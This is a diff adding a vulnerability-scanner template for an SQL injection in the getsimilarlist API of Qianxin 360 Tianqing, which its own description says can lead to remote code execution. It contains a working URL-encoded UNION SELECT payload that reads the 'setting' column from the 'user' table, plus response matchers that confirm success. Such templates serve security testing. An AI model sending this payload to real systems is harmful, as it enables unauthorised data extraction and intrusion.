@@ -1,0 +1,34 @@
+id: qianxin-tianqing-getsimilarlist-sqli
+
+info:
+  name: 奇安信360天擎 getsimilarlist SQL注入漏洞
+  author: SleepingBag945
+  severity: critical
+  tags: qianxin,sqli,iot
+  description: 奇安信360天擎getsimilarlist存在SQL注入漏洞,可rce
+
+http:
+  - raw:
+      - |
+        GET /api/client/getsimilarlist?status[0,1%29+union+all+select+%28%2F%2A%2150000select%2A%2F+79787337%29%2C+setting%2C+setting%2C+status%2C+name%2C+create_time+from+%22user%22+where+1+in+%281]=1&status[0]=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      
+      - type: word
+        words: 
+          - "list"
+          - "total"
+          - "reason\":\"success"
+        part: body 
+        condition: and
+              
+      - type: word
+        part: header
+        words: 
+          - "application/json" 
+                
